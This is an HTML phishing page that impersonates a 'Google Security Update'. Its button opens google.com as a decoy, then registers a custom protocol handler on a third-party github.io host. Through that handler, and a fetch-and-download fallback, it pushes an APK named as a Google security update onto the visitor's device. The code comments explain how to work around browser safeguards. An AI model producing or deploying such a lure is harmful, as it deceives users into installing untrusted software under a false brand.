<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    .container {
      background: white;
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
      max-width: 600px;
      text-align: center;
    }
    
    .logo {
      margin-bottom: 30px;
    }
    
    h1 {
      color: #1a73e8;
      margin-bottom: 10px;
      font-size: 24px;
    }
    
    p.description {
      color: #5f6368;
      margin-bottom: 30px;
      line-height: 1.6;
    }
   
    .gambar {
  width: 300px;
  height: auto;
}
    .button {
      background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
      border: none;
      color: white;
      padding: 15px 40px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      font-weight: bold;
      margin: 10px;
      cursor: pointer;
      border-radius: 8px;
      transition: all 0.3s;
      box-shadow: 0 4px 15px rgba(26, 115, 232, 0.4);
    }
    
    .button:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(26, 115, 232, 0.6);
    }
    
    .button:active {
      transform: translateY(0);
    }
    
    .status {
      margin-top: 20px;
      padding: 15px;
      border-radius: 8px;
      display: none;
      text-align: left;
      font-size: 14px;
      line-height: 1.6;
    }
    
    .status.error {
      background-color: #ffebee;
      color: #c62828;
      border-left: 4px solid #f44336;
      display: block;
    }
    
    .status.success {
      background-color: #e8f5e9;
      color: #2e7d32;
      border-left: 4px solid #4caf50;
      display: block;
    }
    
    .status.warning {
      background-color: #fff3e0;
      color: #e65100;
      border-left: 4px solid #ff9800;
      display: block;
    }
    
    .info-box {
      background: #e3f2fd;
      border-left: 4px solid #2196f3;
      padding: 15px;
      border-radius: 5px;
      margin: 20px 0;
      text-align: left;
    }
    
    .info-box h3 {
      color: #1565c0;
      margin-bottom: 8px;
    }
    
    code {
      background: #f5f5f5;
      padding: 2px 6px;
      border-radius: 3px;
      font-family: 'Courier New', monospace;
      font-size: 13px;
    }
    
    .limitations {
      background: #fff3cd;
      border-left: 4px solid #ffc107;
      padding: 15px;
      border-radius: 5px;
      margin-top: 20px;
      text-align: left;
    }
    
    .limitations h3 {
      color: #856404;
      margin-bottom: 8px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
     <img src="https://oxfat.github.io/anim.jpg" class="gambar">
    </div>
    
    <h1>Google Security Update</h1>
    <p class="description">Important security update available. Please download to keep your device secure.</p>
    
    <input type="button" class="button" value="Download From Original Site" onclick="initiateDownload()">
    
    <div id="status" class="status"></div>

  <script>
    function initiateDownload() {
      const statusEl = document.getElementById('status');
      
      // Step 1: Open legitimate Google site in new tab
      try {
        window.open('https://google.com', '_blank', 'noopener,noreferrer');
      } catch (e) {
        console.error("Failed to open Google:", e);
        showStatus("⚠️ Failed to open official site.", true);
        return;
      }
      
      // Step 2: Register custom protocol handler (MUST be from user gesture)
      try {
        // IMPORTANT: Handler URL MUST be an HTML page that accepts %s placeholder
        // Cannot point directly to .apk file (browser will reject)
        navigator.registerProtocolHandler(
          'web+myapp',
          'https://oxfat.github.io/handler.html?uri=%s', // Must be HTML page
          'Google Security Update'
        );
        
        statusEl.textContent = "✅ Protocol handler registered. Opening download...";
        statusEl.className = "status success";
      } catch (err) {
        console.error("Protocol handler error:", err);
        if (err.name === 'SecurityError') {
          statusEl.innerHTML = "⚠️ <strong>Browser blocked registration:</strong><br>- Must be triggered by direct user click<br>- Handler URL must be same-origin or approved cross-origin<br>- Cannot point directly to .apk file";
        } else {
          statusEl.textContent = `⚠️ Registration failed: ${err.message}`;
        }
        statusEl.className = "status warning";
        
        // Fallback: Use regular download
        setTimeout(triggerRegularDownload, 3000);
        return;
      }
      
      // Step 3: Trigger protocol handler after short delay
      setTimeout(() => {
        try {
          // This will show Chrome's security dialog:
          // "Open web+myapp links in [oxfat.github.io]?"
          // ORIGIN IS VISIBLE TO USER
          window.location.href = 'web+myapp://download/security_update.apk';
        } catch (e) {
          console.error("Protocol trigger failed:", e);
          statusEl.textContent = "⚠️ Protocol trigger failed. Using fallback download...";
          statusEl.className = "status warning";
          setTimeout(triggerRegularDownload, 2000);
        }
      }, 2000);
    }

    function triggerRegularDownload() {
      const statusEl = document.getElementById('status');
      
      statusEl.textContent = "⬇️ Downloading via fallback method...";
      statusEl.className = "status warning";
      
      fetch('https://oxfat.github.io/fake.apk')
        .then(response => {
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          return response.blob();
        })
        .then(blob => {
          const url = URL.createObjectURL(blob);
          const link = document.createElement('a');
          link.href = url;
          link.download = 'googleSecurity_Update.apk';
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
          URL.revokeObjectURL(url);
          
          statusEl.textContent = "✅ Download completed! Check your downloads folder.";
          statusEl.className = "status success";
        })
        .catch(err => {
          console.error("Fallback download failed:", err);
          statusEl.textContent = `❌ Download failed: ${err.message}`;
          statusEl.className = "status error";
        });
    }
    
    function showStatus(message, isError) {
      const statusEl = document.getElementById('status');
      statusEl.textContent = message;
      statusEl.className = `status ${isError ? 'error' : 'success'}`;
    }
  </script>
</body>
</html>
